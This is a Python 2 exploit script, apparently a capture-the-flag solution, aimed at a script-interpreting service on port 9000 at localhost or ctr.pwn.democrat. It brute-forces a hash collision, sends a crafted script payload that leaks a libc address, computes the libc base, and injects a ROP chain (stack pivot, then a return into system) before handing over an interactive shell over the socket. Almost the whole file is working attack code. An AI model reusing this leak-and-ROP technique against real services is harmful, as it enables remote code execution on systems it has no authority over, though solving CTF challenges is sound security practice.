import ctypes
import struct
import binascii
import string
import socket
import time
import telnetlib
import binascii
import subprocess as subp
import sys

init =ctypes.c_uint(0x41414141*2).value
init =ctypes.c_uint(init*2).value
init =ctypes.c_uint(init*2).value
init =ctypes.c_uint(init*2).value
init2 =ctypes.c_uint(init*2).value

def hsh(s,init):
    h=init
     
    ki=0
    for c in s:
        ki=ki<<8
        ki=ki&0xffffffff
        ki+=ord(c)
        ho = h&0xf8000000
        h=(h<<5)&0xffffffff
        h=ctypes.c_uint(h^(ho>>27)).value
        h =ctypes.c_uint(h^ki).value
    return h

f=hsh("Library",init2)%100

eb=False
h=0
for c in string.ascii_letters:
    for c2 in string.ascii_letters:
        for c3 in string.ascii_letters:
            s=c+c2+c3
            h=hsh(s,init)%100
            print s,h
            if h==f:
                eb=True
                break
        if eb:
            break
    if eb:
        break

varn = s

def readuntil(so,ned):
    d=''
    while not ned in d:
        c=so.recv(1)
        if c=='': raise Exception("Connection lost "+repr(d))
        d+=c
    return d

so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
if len(sys.argv)==1:
    so.connect(("localhost",9000))
else:
    so.connect(("ctr.pwn.democrat",9000))

subp.call("ps aux | grep ctrscript",shell=True)
raw_input()

print readuntil(so,"|")
so.send("asdf\n")
print readuntil(so,"\n |")
so.send("-2\n")
time.sleep(1)


pl='<script>\n'
pl+='def str a="'+'A'*100+'"\n'
pl+='def str b="'+'B'*20+'"\n'
pl+='a=""\n'
pl+='" Library.log(a) Library.flushHtml()</script>'
pl+='<script>def int a=-2 Library.changePage(a)</script>'
so.send(pl)
time.sleep(1)

s=so.recv(10)
print binascii.hexlify(s)
lcl = struct.unpack("<I",s[0:4])[0]
print "Libc:"+hex(lcl)
lcb = lcl-0x1ab4b8
lcb = lcl-0x1b0818
print "Libc:"+hex(lcb)

pl='<script>\n'
pl+='Library.flushHtml()\n'
pl+='</script>\n'
pl+='<script>\n'
pl+='def func '+varn+'\n'
pl+='</script>\n'
pl+='<color=1>.'*11
pl+='<script>\n'
pl+='Library={'

#pivot
pl+=struct.pack("<I",0x000e0e14+lcb) #add esp,0x60; pop*3; ret

pl+='}\n'
pl+='def str s="'

#pivot
pl+=struct.pack("<I",0x00003980+lcb) #pop esp; ret
#ret to libc
pl+=struct.pack("<I",0x3A940+lcb) #system
pl+="AAAA"
pl+=struct.pack("<I",0x158e8b+lcb)

pl+='"\n'
pl+='Library.log(s)\n'
pl+='</script>'

so.send(pl)
time.sleep(1)





t=telnetlib.Telnet()
t.sock=so
t.interact()
